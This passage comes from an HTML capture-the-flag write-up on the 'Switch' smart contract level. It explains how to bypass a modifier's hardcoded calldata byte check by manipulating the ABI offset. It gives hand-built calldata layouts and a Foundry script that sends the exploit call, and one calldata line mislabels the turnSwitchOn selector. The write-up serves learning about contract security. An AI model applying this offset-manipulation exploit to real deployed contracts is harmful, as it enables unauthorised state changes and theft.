</span><span>            selector[</span><span style=color:#0086b3>0</span><span>] </span><span style=color:#a71d5d;font-weight:700>== </span><span>offSelector,
</span><span>            </span><span style=color:#183691>"Can only call the turnOffSwitch function"
</span><span>        );
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>flipSwitch</span><span>(bytes memory _data) </span><span style=color:#795da3;font-weight:700>public onlyOff </span><span>{
</span><span>        (bool success, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(this).</span><span style=color:#62a35c>call</span><span>(_data);
</span><span>        </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"call failed :("</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>turnSwitchOn</span><span>() </span><span style=color:#795da3;font-weight:700>public onlyThis </span><span>{
</span><span>        switchOn </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>turnSwitchOff</span><span>() </span><span style=color:#795da3;font-weight:700>public onlyThis </span><span>{
</span><span>        switchOn </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Just have to flip the switch.</ol><ul><li>Solution</ul><ol><li>Switch contract has three functions <code>turnSwitchOff()</code>, <code>turnSwitchOn()</code> and <code>flipSwitch()</code>. In which we can only able to call flipSwitch function.<li>By using this flipSwitch only we have to call the <code>turnSwitchOn()</code> function. For this we need to pass the calldata for the function call <code>turnSwitchOn()</code>.<li>But If we pass the <code>turnSwitchOn()</code> calldata to the <code>flipSwitch()</code> it will be reverted by <code>onlyOff</code> modifier.<li>Because, onlyOff is checking that the calldata's 68 to 72 bytes should only contain the signature of the <code>turnSwitchOff()</code> function.<li>The vulnerability is present inside the <code>onlyOff()</code> modifier as its function signature check byte position is hardcoded (68,4).<li>We can modify the calldata in order to bypass the check and as well as call the <code>turnSwitchOn()</code> function.<li>Lets understand <code>calldata</code> specificly when passing dynamic datatypes as arguments<li>When we call a function on a contract, the calldata will be sent via the transaction as <code>msg.data</code>, Lets see what this data consists.<pre style=color:#323232;background-color:#fff><code><span> calldata with dynamic arguments
</span><span>   => &lt;function signature> &lt;offset> &lt;length of data> &lt;data>
</span><span> Each field will be padded to 32 bytes except function signature.
</span><span>
</span><span> calldata when we call flipSwitch() with turnSwitchOff() function signature 
</span><span>      30c13ade  // flipSwitch() signature
</span><span> 00 : 0000000000000000000000000000000000000000000000000000000000000020   ==> offset - the starting position of the actual data 
</span><span> 20 : 0000000000000000000000000000000000000000000000000000000000000004   ==> length - data length
</span><span> 40 : 20606e1500000000000000000000000000000000000000000000000000000060   ==> data - data that we passed through argument (turnSwitchOff() signature)
</span></code></pre><li>This call to flipSwitch() is succeeded because the check was passed. The check is that from the 68th byte to 72nd byte will be sliced out and this will be checked with the signature of the <code>turnSwitchOff()</code> function.<li>Now we somehow should manage to send the <code>turnSwitchOn()</code> signature along with this calldata. And we should make sure that only <code>turnSwitchOn()</code> signature should be passed to the <code>call</code> inside <code>flipSwitch()</code>.<li>The data which is used inside the function will be specified by the <code>offset</code>. The function will make use of the actual data that is pointed by the offset.<li>As the <code>onlyOff</code> modifier uses the hardcoded check, we can modify the calldata to be able to insert the <code>turnSwitchOff()</code> function signature at the 68th bytes and append the <code>turnSwitchOn()</code> signature.<li>Now we have to change the offset of the calldata in such a way that it points to the <code>turnSwitchOn()</code> signature.<pre style=color:#323232;background-color:#fff><code><span>calldata to bypass onlyOff
</span><span>  => &lt;flipSwitch Singature> &lt;Offset> &lt;Dummy Data> &lt;turnSwitchOff Signature> &lt;length of data> &lt;turnSwitchOn Signature>
</span><span>
</span><span>   30c13ade
</span></code></pre></ol><p>00 : 00000000000000000000000000000000000000000000000000000000000000[60] ==> Offset - position of actual data 20 : 0000000000000000000000000000000000000000000000000000000000000000 ==> Dummy data - to move turnSwitchOff data to 68th byte 40 : 20606e1500000000000000000000000000000000000000000000000000000000 ==> Data - turnSwitchOff() selector (By passes onlyOff) 60 : 0000000000000000000000000000000000000000000000000000000000000004 ==> Length - Length of the turnSwitchOff() signature data 80 : 76227e1200000000000000000000000000000000000000000000000000000000 ==> Actual data - turnSwitchOff() signature<pre style=color:#323232;background-color:#fff><code><span>14. Now this calldata will bypasses the check of onlyOff and we modified the offset to point it to the turnSwitchOn() signature.
</span><span>15. So, now the calldata passed to the `call` inside flipSwitch() will be,
</span></code></pre><pre style=color:#323232;background-color:#fff><code><span>76227e1200000000000000000000000000000000000000000000000000000000
</span></code></pre><pre style=color:#323232;background-color:#fff><code><span>16. This will call the turnSwitchOn() function in Switch contract. Finally we will be able to solve the challenge.
</span><span>
</span><span>`SwitchSolve.s.sol`
</span><span>
</span><span>```javascript
</span><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>
</span><span>import "../src/Switch.sol";
</span><span>
</span><span>contract SwitchSolve is Script {
</span><span> Switch public sw = Switch(0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0);
</span><span> function run() external{
</span><span>     vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>
</span><span>     console.log("Switch  : ", sw.switchOn());
</span><span>
</span><span>     // bytes memory data = abi.encodeWithSignature("turnSwitchOff()");
</span><span>     bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)",0x60, 0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000, 0x04, 0x76227e1200000000000000000000000000000000000000000000000000000000);
</span><span>
</span><span>     console.logBytes(data);
</span><span>
</span><span>     address(sw).call(data);
</span><span>
</span><span>
</span><span>
</span><span>     console.log("Switch  : ", sw.switchOn());
</span><span>
</span><span>
</span><span>     vm.stopBroadcast();
</span><span> }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/SwitchSolve.s.sol:SwitchSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><hr><p>That's it for the write-up ! To connect with me send a request at <a href=https://www.twitter.com/TheMj0ln1r>@TheMj0ln1r</a><h2 id=references>References</h2><ol><li><a href=https://github.com/x676f64/secureum-mind_map target=_blank>Secureum Bootcamp</a><li><a href=https://github.com/ethereumbook/ethereumbook target=_blank>Mastering Ethereum</a></ol></section></article></main></div>